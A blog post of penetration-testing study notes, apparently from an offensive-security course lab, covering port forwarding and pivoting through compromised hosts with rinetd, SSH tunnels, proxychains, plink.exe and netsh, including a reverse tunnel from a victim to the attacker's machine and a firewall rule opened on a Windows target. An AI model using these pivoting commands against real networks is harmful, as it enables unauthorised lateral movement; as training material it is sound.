---
title: Study Notes - 2021/07/07
date: 2021-07-07 14:23:33
tags: [Penetration Testing, Study Notes]
---

# Port Forwarding 
## RINETD
Default configuration file: 
```
cat /etc/rinetd.conf
```

bind address, bind port: listening address/port  connect address/port: destination  

```
# bindadress bindport connectaddress connectport
0.0.0.0 80 216.58.207.142 80
```
forword any connection to port 80 to google  

```
sudo service rinetd restart
ss -antp | grep "80"
nc -nvv 10.11.0.4 80
```

# SSH Tunneling
## SSH local port forwarding
Senario:  
victim1 already compromised, only accpet 8080, 22, 3389 port from outside. victim1 conenct to another subnetwork contains another target. Move tools to victim1 is not eligent and scalable, want to attack from our kali machine  

```
-L local_socket:host:hostport
-L local_socket:remote_socket
             Specifies that connections to the given TCP port or Unix socket
             on the local (client) host are to be forwarded to the given host
             and port, or Unix socket, on the remote side.  This works by al‐
             locating a socket to listen to either a TCP port on the local
             side, optionally bound to the specified bind_address, or to a
             Unix socket.  Whenever a connection is made to the local port or
             socket, the connection is forwarded over the secure channel, and
             a connection is made to either host port hostport, or the Unix
             socket remote_socket, from the remote machine.

-N      Do not execute a remote command.  This is useful for just for‐
             warding ports.

```

```
In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali
machine to port 445 on the Windows Server 2016 target. When we do this, any Microsoft file
sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.
This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port
forward is tunneled through an SSH session to our Linux target on port 22, which is allowed
through the firewall. In summary, the request will hit our Kali machine on port 445, will be
forwarded across the SSH session, and will then be passed on to port 445 on the Windows Server
2016 target.
```

```
kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```

# SSH Remote port forwarding 
Senario:  

the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t
SSH into this server from our Internet-connected Kali machine


```
victim1: ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```

forword all 10.11.0.4:2221 request from kali machien to 127.0.0.1:3306

on kali:
```
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).
PORT STATE SERVICE VERSION
2221/tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1
Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

scan local port will scan target host  


# SSH Dynamic port forwarding  
```
kali> ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
```
With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our
Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to
any host in the target network, through the compromised Linux machine, which we log into as
student

We can run any network application through HTTP, SOCKS4, and SOCKS5
proxies with the help of ProxyChains

add to `/etc/proxychains.conf`  
```
socks4 127.0.0.1 8080
```
```
sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

# PLINK.exe
```
plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```
if it is the first time, it will attmpt to cache the host key and there's a interactive step y/n

solution: 
```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

# netSH
use netsh to do port forwarding on windows, it is installed on windows by default. 

However, for this to work, the Windows system must have the IP Helper service running and IPv6
support must be enabled for the interface we want to use. Fortunately, both are on and enabled
by default on Windows operating systems.  

```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
netstat -anp TCP | find "4455" 
```

By default, firewall does not allow inbound connection to 4455, however, we have system privilege, we can change the firewall configuration  

```
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

before using smbclient, smb need to be configured with min protocal level = smbv2 and restart 
```
/etc/samba/smb.conf
min protocol = SMB2


sudo /etc/init.d/smbd restart
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
```

